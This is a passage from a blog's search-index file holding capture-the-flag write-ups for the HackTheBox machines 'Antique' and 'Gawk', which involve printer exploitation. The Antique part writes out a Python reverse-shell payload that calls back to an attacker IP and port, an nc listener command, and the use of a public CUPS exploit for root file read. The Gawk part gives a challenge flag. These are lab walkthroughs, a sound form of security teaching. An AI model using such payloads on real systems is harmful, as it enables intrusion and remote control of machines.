class="hljs-number"> 103 </span>106<span class="hljs-number"> 111 </span>114<span class="hljs-number"> 115 </span>119<span class="hljs-number"> 122 </span>123<span class="hljs-number"> 126 </span>130<span class="hljs-number"> 131 </span>134<span class="hljs-number"> 135 </span>&quot; | xxd -r -p<br><br>P@ssw0rd@123!!123�q��&quot;2Rbs3CSs��$4�Eu�WGW�(8iIY�aA�&quot;1&amp;1A5<br></code></pre></td></tr></table></figure><p><strong>Connecting via Telnet</strong><br>Now that we have the password, we connect to the Telnet service<br><img src="/img/ant/img7.png" alt="image"><br>After logging in, we can execute commands using the exec syntax. To gain shell access, I used a reverse shell payload:</p><p>Payload:</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-keyword">exec</span> python3 -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;10.10.14.120&quot;</span>,<span class="hljs-number">4444</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>);os.dup2(s.fileno(),<span class="hljs-number">1</span>);os.dup2(s.fileno(),<span class="hljs-number">2</span>);import pty;pty.spawn(<span class="hljs-string">&quot;sh&quot;</span>)&#x27;<br><br></code></pre></td></tr></table></figure><p>But before we do that we have to set up our listener by simply typing<br><code> rlwrap nc -lvnp 4444</code><br><img src="/img/ant/img8.png" alt="image"></p><p>&amp;  that’s it! we’re in!</p><p>Before getting into PrvEsc let us upgrade our shell with python for better interactivity.<br><img src="/img/ant/img9.png" alt="image"><br><strong>Privilege Escalation</strong></p><p>At first I tried putting a rev-shell in the <code>telnet.py</code> file in a hope of it getting executed as root, it didn’t.</p><p>I also ran &lt; $ ps aux &gt; to display all running processes but I didn’t find anything interesting aswell.</p><p>Then I went to check that are running on the server with &lt; $ netstat -nat &gt;</p><p><img src="/img/ant/img10.png" alt="image"><br>As we can see there is a listener running locally on port 631, let’s curl that and see what we get.<br><img src="/img/ant/Untitled.png" alt="image"><br>Hm, our target server is running on CUPS&#x2F;1.6, another quick search for CUPS&#x2F;1.6 cve the first link was a github repo for the exploit of <a href="https://github.com/p1ckzi/CVE-2012-5519">https://github.com/p1ckzi/CVE-2012-5519</a>.</p><p>We’re almost there yay!</p><p>Next I got cloned the repo and started my python server so I can upload the sh file.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs crystal">┌──(kali㉿kali)-[~<span class="hljs-regexp">/…/tracks</span><span class="hljs-regexp">/Printer-Exploitation/</span>Antique/CVE-<span class="hljs-number">2012</span>-<span class="hljs-number">5519</span>]<br>└─<span class="hljs-variable">$ </span>ls<br>cups-root-file-read.sh  README.md<br><br>┌──(kali㉿kali)-[~<span class="hljs-regexp">/…/tracks</span><span class="hljs-regexp">/Printer-Exploitation/</span>Antique/CVE-<span class="hljs-number">2012</span>-<span class="hljs-number">5519</span>]<br>└─<span class="hljs-variable">$ </span>python3 -m http.server<br><br>Serving HTTP on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> port <span class="hljs-number">8000</span> (<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/0.0.0.0:8000/</span>) ...<br></code></pre></td></tr></table></figure><p><img src="/img/ant/img11.png" alt="image"><br>now let’s give the file excution permession with &lt; $ chmod +x cups.sh &gt; and then run it.<br><img src="/img/ant/img12.png" alt="image"><br>That’s it :) we owned the box yay! :D.</p>]]></content>
    
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB: Gawk writeup</title>
    <link href="/2024/08/26/gawk/"/>
    <url>/2024/08/26/gawk/</url>
    
    <content type="html"><![CDATA[<h2 id="HTB-Gawk-writeup"><a href="#HTB-Gawk-writeup" class="headerlink" title="HTB: Gawk writeup"></a>HTB: Gawk writeup</h2><h2 id="GAWK-is-a-very-easy-challenge-in-the-hardware-category-and-the-1st-task-in-the-printer-exploitation-track"><a href="#GAWK-is-a-very-easy-challenge-in-the-hardware-category-and-the-1st-task-in-the-printer-exploitation-track" class="headerlink" title="GAWK is a very easy challenge in the hardware category and the 1st task in the printer exploitation track."></a>GAWK is a very easy challenge in the hardware category and the 1st task in the printer exploitation track.</h2><p><strong>CHALLENGE DESCRIPTION</strong></p><p>I lost access to my computer and need a document urgently which got stuck in a printer. Can you get me the document ?</p><p>Upon starting the chall I was given a host address that I had no clue what to do with it , so I ran to my best friend <em>google</em> to get some answers.</p><p>After looking up some articles about printer hacking I found a tool called <a href="https://github.com/RUB-NDS/PRET"><code>Pret</code></a><br><img src="/img/gwk/image.png" alt="image"><br>So I  cloned the repo and ran the python script against our host ip as it says in the usage example<br><img src="/img/gwk/image3.png" alt="image"></p><p>As easy as it looks, we got a shell! and it’s time to explore the files.<br>Keeping in mind the challenge description we’re looking for a specific file.<br><img src="/img/gwk/image4.png" alt="image"></p><p>Here I found this PDF file so I decoded its base64 using an <a href="https://base64.guru/converter/decode/pdf"><code>online tool</code></a> that would display the file  without the need to download it.</p><p>&amp; we will get the flag on the first page!<br><img src="/img/gwk/image5.png" alt="image"></p><blockquote><p>Flag : HTB{tr4v3rs3_m4n4g3ment_d3240!}</p></blockquote><p>cya in the next writeup!</p>]]></content>
    
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
